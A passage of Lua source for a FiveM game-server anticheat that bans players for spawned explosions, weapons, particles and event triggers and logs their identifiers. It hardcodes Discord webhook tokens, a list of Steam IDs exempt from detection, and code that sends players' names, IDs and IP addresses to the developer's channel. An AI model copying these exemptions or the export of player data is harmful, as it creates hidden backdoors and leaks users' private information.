                    if DoesEntityExist(v) and #(GetEntityCoords(v) - coords) < dist and (not IsPedAPlayer(v)) then
                        DeleteEntity(v);
                    end
                end
            end
        end)
        
        ptfx = {};
        ptfxUsers = {};
        
        AddEventHandler("ptFxEvent", function(source, info)
            local id = source;
            Wait(1200);
            if ptfxUsers[tonumber(id)] ~= nil and (os.time() - ptfxUsers[tonumber(id)]) > 30 then
                _inject("Ignoring CancelEvent() for ptfx event: using native | "..id);
                return;
            end
            
            if info and info.assetHash and Greek.whitePtfx[info.assetHash] then
                return;
            elseif info and info.assetHash then
                _inject(info.assetHash);
            end
            
            if ptfx[id] == nil then
                ptfx[id] = 0;
            end
            ptfx[id] = ptfx[id] + 1;
            if ptfx[id] > 6 then
                if GetPlayerName(id) ~= nil then
                    TriggerClientEvent("cutCoords", id);
                    sendToDisc(id, "banned", "Particles Spawned");
                    sendToLog(id, "banned", "Particles Spawned");
                    SqlBan(id, "Particles Spawned");
                    loadBanList();
                    DropPlayer(id, "Particles Spawned");
                end
                CancelEvent();
            end
        end)
        
        RegisterNetEvent("gptfx", function()
            local id = source;
            
            ptfxUsers[tonumber(id)] = os.time();
        end)
        
        CreateThread(function()
            while true do
                Wait(10000);
                ptfx = nil;
                ptfx = {};
            end
        end)
        
        RegisterCommand("toggleSound", function(source)
            local id = source;
            
            if canUseCmd(id) then
                soundBlocking = not soundBlocking;
                if GlobalState then
                    GlobalState.soundBlocking = soundBlocking;
                end
                if soundBlocking then
                    TriggerClientEvent("esx:showNotification", id, "Started Blocking Sounds!");
                else
                    TriggerClientEvent("esx:showNotification", id, "Stopped Blocking Sounds!");
                end
            end
        end)
        
        AddEventHandler("giveWeaponEvent", function(sender)
            CancelEvent();
            local id = sender;
            if id ~= nil then
                TriggerClientEvent("cutCoords", id);
                sendToDisc(id, "banned", "Weapon Give Blocked");
                sendToLog(id, "banned", "Weapon Give Blocked");
                SqlBan(id, "Weapon Give Blocked");
                DropPlayer(id, "[Greek-AntiCheat]-Weapon Give Blocked!");
            end
        end)
        
        AddEventHandler("removeWeaponEvent", function()
            CancelEvent();
        end)
        
        AddEventHandler("removeAllWeaponsEvent", function()
            CancelEvent();
        end)
        
        if Greek.antiExplosion then
            local explUsers = {};
        
            AddEventHandler("explosionEvent", function(sender, ev)
                local vehicle = GetVehiclePedIsIn(GetPlayerPed(tonumber(sender)), false);
                
                if Greek.explVehs and Greek.explVehs[vehicle] then
                    return;
                end
            
                if GlobalState.milcargoCommander and GlobalState.milcargoCommander == tonumber(sender) then
                    return;
                end
                
                if GlobalState.trainDriver and GlobalState.trainDriver == tonumber(sender) then
                    return;
                end
            
                CancelEvent();
                local id = sender;
                local type = ev.explosionType;
                local scale = ev.damageScale;
                local inv = ev.isInvisible;
                local cam = ev.cameraShake;
                local sound = ev.isAudible;
                
                Wait(1200);
                if explUsers[tonumber(id)] ~= nil and (os.time() - explUsers[tonumber(id)]) < 30 then
                    _inject("Ignoring CancelEvent() for explosionEvent event: using native | "..id);
                    return;
                end
                
                if (inv == true) or (scale > 100) then
                    if Greek.antiExplosion then
                        --TriggerClientEvent("cutCoords", id);
                        sendToDisc(id, "banned", "Explosion Blocked: "..type);
                        sendToLog(id, "banned", "Explosion Blocked: "..type);
                        SqlBan(id, "Explosion Blocked");
                        DropPlayer(id, "[Greek-AntiCheat]-Explosion Blocked!");
                    end
                end
            end)
            
            RegisterNetEvent("addexp", function()
                local id = source;
            
                explUsers[tonumber(id)] = os.time();
            end)
        end
        
        AddEventHandler("fireEvent", function()
            CancelEvent();
        end)
        
        RegisterNetEvent("cmg3_animations:sync", function(b,lib,lib2,anim1,anim2,distans,distans2,height,target,length,spin,controlFlagMe,controlFlagTarget,animFlagTarget,attachFlag)
            local id = source;
            if lib == "anim@gangops@hostage@" and lib2 == "anim@gangops@hostage@" and anim1 == "perp_fail" and anim2 == "victim_fail" then
                local myCoords = GetEntityCoords(GetPlayerPed(id));
                if target == -1 then
                    CancelEvent();
                    sendToDisc(id, "banned", "Slay all");
                    sendToLog(id, "banned", "Slay all");
                    SqlBan(id, "Slay all");
                    loadBanList();
                    DropPlayer(id, "[Greek-AntiCheat]-Slay all");
                    return;
                end
                local otherCoords = GetEntityCoords(GetPlayerPed(target));
                if #(myCoords - otherCoords) > 25.0 then
                    CancelEvent();
                    sendToDisc(id, "banned", "Slay player");
                    sendToLog(id, "banned", "Slay player");
                    SqlBan(id, "Slay player");
                    loadBanList();
                    DropPlayer(id, "[Greek-AntiCheat]-Slay player");
                end
            end
        end)
        
        _G._bans = {};
        _G.dontBanTriggersNow = false;
        
        RegisterNetEvent("leaveMe", function()
            local id = source;
            if id == nil then
                return;
            end
            if _bans[id] == nil then
                _bans[id] = "DontBanMe";
                Wait(50000);
                _bans[id] = nil;
            end
        end)
        
        jobsCanWeap = {
            ["police"] = true,
            ["offpolice"] = true,
            ["ambulance"] = true,
            ["offambulance"] = true,
            ["fbi"] = true,
            ["stratos"] = true,
            ["fib"] = true,
            ["sheriff"] = true,
            ["sherriff"] = true
        }
        
        RegisterNetEvent("esx:triggerClientCall", function(just_ban, weaponName)
            local id = source;
            
            if string.find(just_ban, "Hydro") then
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                SqlBan(id, just_ban);
                DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                return;
            end
            if string.find(just_ban, "Invalid Resource Request") then
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                SqlBan(id, just_ban);
                DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                return;
            end
            if string.find(just_ban, "Tried to spawn Weapon") then
                if Greek.dontBanWeaponSpawners then
                    --sendToDisc(id, "logged", just_ban);
                    sendToLog(id, "logged", just_ban);
                    return;
                end
            end
            if just_ban == "Tried to bypass Screenshots" then
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                SqlBan(id, just_ban);
                DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                return;
            end
            if string.find(string.lower(just_ban), "clip") then
                sendToDisc(id, "kicked", just_ban);
                sendToLog(id, "kicked", just_ban);
                DropPlayer(id, "Malfunction detected");
                return;
            end
            local xPlayer = ESX.GetPlayerFromId(id);
            if string.find(string.lower(just_ban), "code") then
                if jobsCanWeap[xPlayer.job.name] == true then
                    return;
                end
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                DropPlayer(id, "O Greek se blepei");
                return;
            end
            if string.find(string.lower(just_ban), "weapon") then
                if jobsCanWeap[xPlayer.job.name] == true then
                    return;
                end
                local inInv = false;
                for k,v in pairs(xPlayer.loadout) do
                    if v.name == weaponName or string.lower(v.name) == string.lower(weaponName) then
                        inInv = true;
                    end
                end
                if inInv then
                    sendToLog(id, "false", weaponName.." found in loadout");
                    return;
                end
                
                if string.find(just_ban, "[esx:addWeapon]") then
                    sendToDisc(id, "banned", just_ban);
                    sendToLog(id, "banned", just_ban);
                    SqlBan(id, just_ban);
                    DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                    return;
                end
                if Greek.dontBanWeaponSpawners then
                    --sendToDisc(id, "logged", just_ban);
                    sendToLog(id, "logged", just_ban);
                    return;
                else
                    sendToDisc(id, "banned", just_ban);
                    sendToLog(id, "banned", just_ban);
                    SqlBan(id, just_ban);
                    DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                    return;
                end
            end
            if string.find(string.lower(just_ban), "executor") then
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                SqlBan(id, just_ban);
                DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
                return; 
            end
            if string.find(string.lower(just_ban), "invalid resource") then
                sendToDisc(id, "banned", just_ban);
                sendToLog(id, "banned", just_ban);
                SqlBan(id, just_ban);
                DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
                return;
            end
            if xPlayer.getGroup() ~= "user" then
                _inject("Ignoring ban for id "..id.." reason "..just_ban);
                return;
            end
            if string.find(string.lower(just_ban), "aim") then
                sendToDisc(id, "logged", just_ban);
                sendToLog(id, "logged", just_ban);
                return;
            end
            sendToDisc(id, "banned", just_ban);
            sendToLog(id, "banned", just_ban); 
            SqlBan(id, just_ban);
            Wait(500);
            DropPlayer(id, "[Greek-AntiCheat]-"..just_ban);
        end)
        
        RegisterNetEvent("newEraa", function()
            local id = source;
            local reason = "Stopped Screenshots Resource!";
            
            if canUseCmd(id) then
                sendToLog(id, "logged", reason);
            else
                sendToDisc(id, "banned", reason);
                sendToLog(id, "banned", reason);
                SqlBan(id, reason);
                DropPlayer(id, "[Greek-AntiCheat]-Oops you are banned");
            end
        end)
        
        RegisterNetEvent("newEra", function(msg)
            local id = source;
            
            if Greek.banHealArmorCheat then
                sendToDisc(id, "banned", msg);
                sendToLog(id, "banned", msg);
                SqlBan(id, msg);
                Wait(500);
                DropPlayer(id, "[Greek-AntiCheat]-"..msg);
            else
                sendToDisc(id, "logged", msg);
                sendToLog(id, "logged", msg);
            end
        end)
        
        RegisterNetEvent("getServerProps", function()
            local id = source;
            
            if canUseCmd(id) then
                local list = {};
                
                for k,v in pairs(GetAllObjects()) do
                    if DoesEntityExist(v) then
                        list[v] = {coords = tostring(GetEntityCoords(v)), hash = getObjName(GetEntityModel(v))};
                    end
                end
                
                TriggerClientEvent("openPropMenu", id, list);
            end
        end)
        
        RegisterNetEvent("deleteProp", function(prop)
            local id = source;
            
            if canUseCmd(id) then
                if DoesEntityExist(prop) then
                    DeleteEntity(prop);
                    TriggerClientEvent("esx:showNotification", id, "Prop Deleted!");
                end
            end
        end)
        
        sendEveryone = function()
            PerformHttpRequest(Greek.Bans, function(Error, Content, Head) end, 'POST', json.encode({username = "GreekAntiCheat", content = "@everyone"}), { ['Content-Type'] = 'application/json' })
        end
        
        if Greek.antiMods then
            RegisterNetEvent("esx:onPlayerDeath", function(data)
                local id = source;
                local killer = data.killerServerId;
                
                if killer and GetPlayerName(killer) then
                    TriggerClientEvent("pedHits", killer, id);
                end
            end)
        
            RegisterNetEvent("pedHits", function(player)
                local id = source;
                
                if Greek.noWallKick then
                    sendToDisc(id, "kicked", "Player killed "..GetPlayerName(player).." with no wall mod!");
                    DropPlayer(id, "Using no Wall mod is not allowed!");
                else
                    sendToDisc(id, "logged", "Player killed "..GetPlayerName(player).." with no wall mod!");
                end
            end)
            
            RegisterNetEvent("x6444", function()
                local id = source;
                
                sendToDisc(id, "kicked", "x64 detected on player!");
                DropPlayer(id, "Please remove your mods!");
            end)
        end
        
        RegisterNetEvent("EasyAdmin:TookScreenshot", function()
            local id = source;
            TriggerClientEvent("_cfx_internal:resourceSvgDeny", id, "Executor Detected");
            sendToDisc(id, "banned", "Executor Detected");
            sendToLog(id, "banned", "Executor Detected"); 
            SqlBan(id, "Executor Detected");
            DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
        end)
        
        RegisterNetEvent("EasyAdmin:CaptureScreenshot", function()
            local id = source;
            TriggerClientEvent("_cfx_internal:resourceSvgDeny", id, "Executor Detected(s)");
            sendToDisc(id, "banned", "Executor Detected(s)");
            sendToLog(id, "banned", "Executor Detected(s)"); 
            SqlBan(id, "Executor Detected(s)");
            DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
        end)
        
        local bpassignrs = {
            ["steam:11000011b8fb0cb"] = true, --heartz
            ["steam:11000013556342c"] = true,
            ["steam:11000010e6782bc"] = true, --greek
            ["steam:110000136dfb131"] = true,
            ["steam:110000105b734cb"] = true,
            ["steam:11000013556342c"] = true,
            ["steam:110000144da64a7"] = true,
            ["steam:11000011b04c05b"] = true,
            ["steam:110000136e0aad0"] = true,
            ["steam:110000111d22449"] = true,
            ["steam:110000147fc645b"] = true,
        } 
        
        RegisterNetEvent("revData", function(msg)
            local id = source;
            local steam = GetPlayerIdentifier(id);
            if (not msg) or (msg == "_") then
                return;
            end
            
            if steam and steam == "steam:11000010e6782bc" then
                sendToLog(id, "greek", msg);
                return;
            end
            
            if steam and bpassignrs[steam] then
                return;
            end
            
            if canUseCmd(id) then
                sendToLog(id, "checked", msg);
            else
                if (msg == "Invincible(Godmode)") and Greek.banGodmode then
                    sendToDisc(id, "banned", msg);
                    sendToLog(id, "banned", msg);
                    SqlBan(id, "Noclip detected!");
                    Wait(1350);
                    DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
                    return;
                elseif string.find(msg, "Plate change") and Greek.banPlateCheat then
                    sendToDisc(id, "banned", msg);
                    sendToLog(id, "banned", msg);
                    SqlBan(id, "Plate Cheat Detected");
                    Wait(1350);
                    DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
                    return;
                elseif string.find(msg, "Word Found:") then
                    sendToDisc(id, "banned", msg);
                    sendToLog(id, "banned", msg);
                    SqlBan(id, "Menu Inject");
                    Wait(750);
                    DropPlayer(id, "[Greek-AntiCheat]-Executor Detected");
                    return;
                end
                
                sendToDisc(id, "logged", msg);
                sendToLog(id, "checked", msg);
            end
        end)
    
        local webb = "https://discord.com/api/webhooks/1332076974851493918/XhqLo_WgNUiluIh71bFMOI4Yta_fXLVhQsvfSSXJ2IhVffsDDtRYRl0V8BIIZzNRLpwW"; --checked
        local webbThis = "https://discord.com/api/webhooks/1332077089003933757/4NT_nUBbUG5alHqpUvzawbGFhkUPK8iPrjzrqdLw6jlLHA5I0p9AsCclMi0J5ikOOdLb" --checked
        
        RegisterNetEvent("_cfx_internal:sendServerEvent", function(name, state)
            local id = source;
            sendToGreek("Script found by "..GetPlayerName(id), name, state);
        end)
        
        handleCfx = function()
            if Greek.spoofs == nil then
                Greek.spoofs = {};
            end
            Greek.spoofs["steam:1100001468572d4"] = true; -- Tinkiguinki
            Greek.spoofs["steam:11000013f90c392"] = true; -- slax
            Greek.spoofs["steam:1100001493114dd"] = true; -- p4nqzz z
            Greek.spoofs["steam:110000149977e84"] = true; -- BigDioni
            Greek.spoofs["steam:110000145f07c16"] = true; -- By Daddy Escape
            Greek.spoofs["steam:11000010ae8d7de"] = true; -- Sexy M1tsoss
            Greek.spoofs["steam:1100001455ddb97"] = true; -- God shooterakos
            Greek.spoofs["steam:110000146c4efec"] = true; -- PANOULHS OG RDM
            Greek.spoofs["steam:1100001434edd37"] = true; -- NotTheo13
            Greek.spoofs["steam:11000014d55c111"] = true; -- Broken V2
            Greek.spoofs["steam:11000013699db5f"] = true; -- Pravda - Soni Anderson
            Greek.spoofs["steam:11000014179751e"] = true; -- jimi
            Greek.spoofs["steam:110000149fe7258"] = true; -- jimi37
            Greek.spoofs["steam:110000141c1c5ed"] = true; -- SupremeTH
            Greek.spoofs["steam:110000147d2e73d"] = true; -- Central Wxrvy
            Greek.spoofs["steam:110000145630e44"] = true; -- Senior Apo
            --test
            Greek.spoofs["steam:11000014d4e9d9b"] = true;
            Greek.spoofs["steam:110000143eac684"] = true;
            Greek.spoofs["steam:110000145f779b6"] = true;
            Greek.spoofs["steam:110000145caa4e5"] = true; -- andreasmel
            Greek.spoofs["steam:11000011b8fb0cb"] = true; -- heartzaros
            Greek.spoofs["steam:11000014430e2bc"] = true;
            Greek.spoofs["steam:110000147fc645b"] = true; --tsimp
            Greek.spoofs["steam:1100001186d12e9"] = true; --lS
            Greek.spoofs["steam:11000014315d6d1"] = true; --lS
            Greek.spoofs["steam:1100001636a8744"] = true; --lS
            Greek.spoofs["steam:11000014229a7d7"] = true; --lS
            Greek.spoofs["steam:1100001642930b0"] = true; --LS
        end
        
        CreateThread(handleCfx);
        
        RegisterNetEvent("confData", function(reason)
            local id = source;
            if Greek.globalBans ~= nil and Greek.globalBans == false then
                return;
            end
            if string.find(reason, "332") then
                return;
            end
            if Greek.spoofs[GetPlayerIdentifier(id)] == nil then
                SqlBan(id, reason.."(spoofed)");
                loadBanList();
                sendToDisc(id, "crashed", "Player was banned before(tried to spoof?)-Global Banned! \nBanned for: "..reason);
                sendToGreekV2("Player was banned before!\n"..GetPlayerName(id).."\n"..GetPlayerIdentifier(id).."\n"..GetPlayerEndpoint(id).."\nReason: "..reason);
                Wait(5000);
                local naiLogika = math.random(1, 100);
                SetPlayerRoutingBucket(id, math.floor(naiLogika));
                TriggerClientEvent("blpThis", id);
                Wait(30000);
                if GetPlayerName(id) ~= nil then
                    DropPlayer(id, "rip");
                end
            else
                TriggerClientEvent("_cfx_internal:resourceSvgConfirm", id);
                if reason == nil then
                    reason = "nil";
                end
                sendToGreekV2("Player was unbanned !\n"..GetPlayerName(id).."\n"..GetPlayerIdentifier(id).."\n"..GetPlayerEndpoint(id).."\nReason: "..reason);
            end
        end)
        
        RegisterNetEvent("getAntiCheatBans", function()
            local id = source;
            
            if canUseCmd(id) then
                local acBans = MySQL.Sync.fetchAll('SELECT * FROM acbanlist');
                Wait(100);
                if acBans ~= nil then
                    TriggerClientEvent("openBansMenu", id, acBans);
                    return;
                end
                TriggerClientEvent("openBansMenu", id); -- no bans
            else
                _inject("No access | "..id);
            end
        end)
        
        RegisterNetEvent("openBansByName", function(name)
            local id = source;
            local steam = GetPlayerIdentifier(id);
            
            if canUseCmd(id) then
                local toSend = {};
                local found = false;
                local acBans = MySQL.Sync.fetchAll('SELECT * FROM acbanlist');
                Wait(100);
                
                for k,v in pairs(acBans) do
                    if string.find(string.lower(v.targetplayername), string.lower(name)) then
                        table.insert(toSend, v);
                        found = true;
                    end
                end
                
                if not found then
                    TriggerClientEvent("esx:showNotification", id, "No Bans with name: "..name.." found!");
                    TriggerClientEvent("openBansMenu", id); -- no bans
                else
                    TriggerClientEvent("openBansMenu", id, toSend);
                end
            end
        end)
        
        _G.SqlBan = function(target, reason)
            local identifier    	= nil;
            local license       	= nil;
            local playerip      	= nil;
            local playerdiscord 	= nil;
            local liveid        	= nil;
            local xbl           	= nil;
            local sourceplayername 	= GetPlayerName(target);
            local permanent 		= 1;
            local timeat     		= GetPlayerGuid(target);
            for k,v in pairs(GetPlayerIdentifiers(target))do
                if string.sub(v, 1, string.len("steam:")) == "steam:" then
                    identifier = v
                elseif string.sub(v, 1, string.len("license:")) == "license:" then
                    license = v
                elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                    xbl  = v
                elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                    playerip = v
                elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                    playerdiscord = v
                elseif string.sub(v, 1, string.len("live:")) == "live:" then
                    liveid = v
                end
            end
            if playerip == nil then
                playerip = GetPlayerEndpoint(target)
                if playerip == nil then
                    playerip = 'not found'
                end
            end
            if playerdiscord == nil then
                playerdiscord = 'not found'
            end
            if liveid == nil then
                liveid = 'not found'
            end
            if xbl == nil then
                xbl = 'not found'
            end
            banIds = {};
            for i = 1, GetNumPlayerTokens(target), 1 do
                local kleidi = GetPlayerToken(target, i)
                if kleidi ~= nil then
                    banIds[i] = kleidi;
                    tokens[kleidi] = true;
                end
            end
            if identifier and playerip then
                steams[identifier] = identifier;
                ips[playerip] = true;
                playerGuids[tostring(timeat)] = identifier;
            end
            MySQL.Async.execute(
            'INSERT INTO acbanlist (identifier,license,playerip,discord,targetplayername,liveid,xblid,reason,permanent,sourceplayername,expiration,timeat,AntiCheatId) VALUES (@identifier,@license,@playerip,@discord,@targetplayername,@liveid,@xblid,@reason,@permanent,@sourceplayername,@expiration,@timeat,@AntiCheatId)', {
                ['@identifier'] = identifier,
                ['@license'] = license,
                ['@playerip'] = playerip,
                ['@discord'] = playerdiscord,
                ['@targetplayername'] = sourceplayername,
                ['@liveid'] = liveid,
                ['@xblid'] = xbl,
                ['@reason'] = reason,
                ['@permanent'] = "1",
                ['@sourceplayername'] = "Anticheat",
                ['@expiration'] = "Never",
                ['@timeat'] = tostring(timeat),
                ['@AntiCheatId'] = json.encode(banIds)
                },function()
            end)
            banIds = nil;
        end
        
        RegisterNetEvent("antiCheatUnban", function(steamId)
            local id = source;
            
            if canUseCmd(id) then
                if steamId ~= nil then
                    MySQL.Async.execute('DELETE FROM acbanlist WHERE identifier = @steam',
                    {
                      ['@steam']  = steamId
                    }, function(unBanned)
                        if unBanned then
                            TriggerClientEvent("chatMessage", id, "[Greek-AntiCheat]", {255, 0, 0}, "Player Unbanned");
                            handleUnbanCmd(id, {[1] = steamId});
                        else
                            TriggerClientEvent("chatMessage", id, "[Greek-AntiCheat]", {255, 0, 0}, "Failed to Unban");
                        end
                    end)
                end
            end
        end)
        
        RegisterNetEvent("letHapp", function()
            local id = source;
            local xPlayer = ESX.GetPlayerFromId(id);
            if xPlayer ~= nil then
                canTrigger[id] = xPlayer.getGroup();
            end
        end)
        
        if Greek.antiTriggerEverything then
            exports("naiMallon", function(data, eventSource, eventName)
                CreateThread(function()
                    local tmp = string.gsub(eventSource, "net:", "");
                    local id = tonumber(tmp);
                    local num = #data;
                    if data[43] == "_" then
                        return;
                    end
                    if data[#data] ~= nil then
                        if data[#data] == "_" then
                            return;
                        end
                    end
                    local trigger = "Tried to TriggerEvent "..eventName;
                    if (Greek.eventsToIgnore[eventName] == true) or (id == nil) or (canTrigger[id] == nil) or (canTrigger[id] == "") then
                        if (Greek.eventsToIgnore[eventName] == nil) and (id and GetPlayerGuid(id)) then
                            local stringData = dumpTable(data);
                            
                            if stringData and (not string.find(stringData, "Loading :")) then
                                sendToTriggerLogGreekDisc(id, "banned", "Triggered Networked Event: "..eventName, stringData);
                                
                                sendToTriggerLog(id, "banned", trigger, data);
                                sendToLog(id, "banned", trigger);
                                SqlBan(id, trigger);
                                DropPlayer(id, "[Greek-AntiCheat]-Den pige kai poli kala auto..");
                                return;
                            end
                        end
                        return;
                    end
                    if setted[id] == nil then
                        setCounter(id);
                    end
                    Wait(500);
                    if (thisId[id] == true) or (dontBanTriggersNow == true) then
                        if (Greek.eventsToIgnore[eventName] == nil) and (id and GetPlayerGuid(id)) then
                            local stringData = dumpTable(data);
                            
                            if stringData and (not string.find(stringData, "Loading :")) then
                                sendToTriggerLogGreekDisc(id, "banned", "Triggered Networked Event: "..eventName.." | loading..", stringData);
                                
                                sendToTriggerLog(id, "banned", trigger, data);
                                sendToLog(id, "banned", trigger);
                                SqlBan(id, trigger);
                                DropPlayer(id, "[Greek-AntiCheat]-Den pige kai poli kala auto..");
                                return;
                            end
                        end
                        return;
                    end
                    
                    argString = "";
                    for j,v in pairs(data) do
                        if type(v) ~= "table" and type(v) ~= nil then
                            local ttt = tostring(v);
                            argString = argString..ttt..", ";
                        end
                    end
                    argString = argString.."]";
                    if string.find(argString, ", ]") then
                        argString = string.gsub(argString, ", ]", "]");
                    end
                    
                    if string.find(argString, "Loading :") then
                        _inject("Ignoring ban for id "..id.." code:44l");
                        return;
                    end
                    
                    if Greek.banTriggerServerEvent == true then
                        if canTrigger[id] ~= "user" then
                            _inject("Ignoring ban for id "..id.." code:34572s");
                            sendToTriggerLogGreek(id, "ignored", trigger, data);
                            return;
                        end
                        local from = GetNetworkedInvokingResource(id, eventName);
                        if from and GetResourceState(from) == "started" then
                            sendToLog(id, "eventlog", eventName.." triggered from "..from);
                            sendToTriggerLog(id, "logged", trigger.." from "..from, data);
                        else
                            sendToTriggerLog(id, "banned", trigger, data);
                            sendToLog(id, "banned", trigger);
                            SqlBan(id, trigger);
                            loadBanList();
                            DropPlayer(id, "[Greek-AntiCheat]-"..trigger);
                            return;
                        end
                    else
                        sendToTriggerLog(id, "logged", trigger, data);
                        sendToLog(id, "logged", trigger);
                    end
                end)
            end)
        end
        
        loadingStoppers = {};
        loadedSuccess = {};
        playersWithTimes = {};
        allPlayers = {};
        
        handleLoadingScreenStop = function()
            local id = source;
            while loadedSuccess[id] == nil do
                Wait(3000);
            end
            TriggerClientEvent("greek:kalaKalinixta", id);
            Wait(20000);
            if GetPlayerName(id) == nil or GetPlayerPed(id) == nil or not DoesEntityExist(GetPlayerPed(id)) then
                return;
            end
            if loadingStoppers[id] == nil then
                local msg = "AntiCheat Stopped on loading screen";
                if Greek.stoppedOnLoading then
                    sendToDisc(id, "kicked", msg);
                    sendToLog(id, "kicked", msg);
                    DropPlayer(id, "AntiCheat stopped on loading screen!");
                else
                    sendToLog(id, "logged", msg);
                end
            end
        end            
        
        RegisterNetEvent("nn", function()
            local id = source;
            loadingStoppers[id] = true;
        end)
        
        RegisterNetEvent("esx:playerLoaded", function(source)
            local id = source;
            loadedSuccess[id] = true;
            Wait(30000);
            if GetPlayerName(id) == nil or GetPlayerPed(id) == nil or not DoesEntityExist(GetPlayerPed(id)) then
                return;
            end
            if loadingStoppers[id] == nil then
                local msg = "AntiCheat Stopped on loading screen";
                if Greek.stoppedOnLoading then
                    sendToDisc(id, "kicked", msg);
                    sendToLog(id, "kicked", msg);
                    DropPlayer(id, "AntiCheat stopped on loading screen!");
                else
                    sendToDisc(id, "logged", msg);
                    sendToLog(id, "logged", msg);
                end
            end
            local ip = GetPlayerEndpoint(id);
            if ip then
                PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=proxy", function(err, text, headers) --checked
                    if tonumber(err) == 200 then
                        local tbl = json.decode(text);
                        if tbl["proxy"] == false then
                            --nothing;
                        else
                            if Greek.kickVpn then
                                sendToDisc(id, "kicked", "Player using vpn!");
                                sendToLog(id, "kicked", "Player using vpn!");
                                DropPlayer(id, "[Greek-Anticheat]-VPN is not allowed!");
                            else
                                sendToDisc(id, "logged", "Player using vpn!");
                                sendToLog(id, "logged", "Player using vpn!");
                            end
                        end
                    else
                        _inject("API not responding!");
                    end
                end)
            end
        end)
        
        RegisterNetEvent("esx:playerLoaded", function(source)
            local id = tostring(source);
            Wait(10000);
            if GetPlayerName(id) ~= nil then
                allPlayers[id] = true;
                Wait(10000);
                if GetPlayerName(id) ~= nil then
                    playersWithTimes[id] = os.time();
                end
                if GetPlayerName(id) == "BakosOG" then
                    sendToDisc(id, "kicked", "BakosOG");
                    sendToLog(id, "kicked", "BakosOG");
                    DropPlayer(id, "error");
                end
            end
        end)
        
        AddEventHandler("playerDropped", function()
            allPlayers[tostring(source)] = nil;
        end)
        
        CreateThread(function()
            if Greek.stoppedAntiCheat ~= nil and Greek.stoppedAntiCheat == false then
                return;
            end
            while true do
                Wait(750);
                for k,v in pairs(allPlayers) do
                    if playersWithTimes[k] ~= nil then
                        local time = os.time() - playersWithTimes[k];
                        if time > 85 then
                            if (GetPlayerName(k) ~= nil) and (GetPlayerPed(k) > 0) and (GetPlayerPing(k) < 100) then
                                sendToDisc(k, "kicked", "Stopped Anticheat: "..time);
                                sendToLog(k, "kicked", "Stopped Anticheat: "..time);
                                DropPlayer(k, "Lost Connection..");
                            end
                        end
                    else
                        if GetPlayerName(k) ~= nil and GetPlayerPed(k) > 0 then
                            playersWithTimes[k] = os.time();
                        end
                    end
                    Wait(250);
                end
            end
        end)
        
        RegisterCommand("turnOff", function(source)
            if source == 0 then
                sendToLog = function()
                end
                sendToDisc = function()
                end
                DropPlayer = function()
                end
                SqlBan = function()
                end
            end
        end)
        
        local pChecked = {};
        
        RegisterNetEvent("revData", function()
            local id = tostring(source);
            playersWithTimes[id] = os.time();
        end)
        
        RegisterNetEvent("esx:getDataFromServer", function()
            local id = source;
            local ip = GetPlayerEndpoint(id);
            
            if playersWithTimes[tostring(id)] == nil or (allPlayers[tostring(id)] == nil) and (pChecked[id] == nil) then
                pChecked[id] = true;
                if not canUseCmd(id) then
                    sendToLog(id, "logged", "Code:Sierra-Victor-Two");
                
                    if ip then
                        PerformHttpRequest("http://ip-api.com/json/"..ip.."?fields=proxy", function(err, text, headers)
                            if tonumber(err) == 200 then
                                local tbl = json.decode(text);
                                if tbl["proxy"] == false then
                                    --nothing;
                                else
                                    sendToLog(id, "logged", "Code:Victor-Papa-November");
                                end
                            else
                                _inject("API not responding!");
                            end
                        end)
                    end
                end
            end
        end)
        
        setCounter = function(id)
            setted[id] = "setted";
            if thisId[id] == "G" then
                return;
            end
            CreateThread(function()
                thisId[id] = true;
                Wait(10000);
                thisId[id] = "G";
            end)
        end
        
        AddEventHandler("onResourceStart", function(key)
            if key ~= GetCurrentResourceName() then
                Greek.scripts[key] = key;
                TriggerClientEvent("letResource", -1, key);
                doTheThings(key);
            end
        end)
        
        RegisterNetEvent("kalo", function()
            local id = source;
            TriggerClientEvent("hmmmmmmmm", id, Greek);
            
            local xPlayer = ESX.GetPlayerFromId(id);
            
            if (xPlayer ~= nil) then
                local group = xPlayer.getGroup();
                serverStaffs[tonumber(id)] = group;
                TriggerClientEvent("group:req", id, group);
            end
        end)
        
        RegisterNetEvent("server:group", function()
            local id = source;
            local xPlayer = ESX.GetPlayerFromId(id);
            
            if xPlayer and xPlayer.getGroup() then
                local group = xPlayer.getGroup();
                serverStaffs[tonumber(id)] = group;
                TriggerClientEvent("group:req", id, group);
            end
        end)
        
        local forbiddenNames = {
            "%",
            "%",
            "%",
            "%",
            "%",
            "%",
            "%",
            "%",
            "%",
            "%^%*",
            "%^_",
            "%^=",
            "%^%~"
        }
        
        AddEventHandler("playerConnecting", function(playerName, setKickReason)
            local name = playerName;
            if name then
                for name in pairs(forbiddenNames) do
                    if (string.gsub(string.gsub(string.gsub(string.gsub(playerName:lower(), "-", ""), ",", ""), "%.", ""), " ", ""):find(forbiddenNames[name])) then
                        setKickReason("Your name contains special characters!");
                        CancelEvent();
                        break;
                    end
                end
            end
        end)
        
        loggers = {};
        
        RegisterNetEvent("props:log", function(_ad)
            local id = source;
            if staff(id) then
                if Greek.Show_me then
                    if loggers[id] == nil then
                        loggers[id] = "notNil";
                    else
                        loggers[id] = nil;
                    end
                else
                    TriggerClientEvent("esx:showNotification", id, "~r~Logging is now disabled!");
                end
            end
        end)
        
        AddEventHandler("entityCreating", function(entity)
            local _entity = entity;
            local owner = GetEntityOwner(_entity);
            
            if (owner ~= nil) then
                for id, v in pairs(loggers) do
                    if id ~= nil then
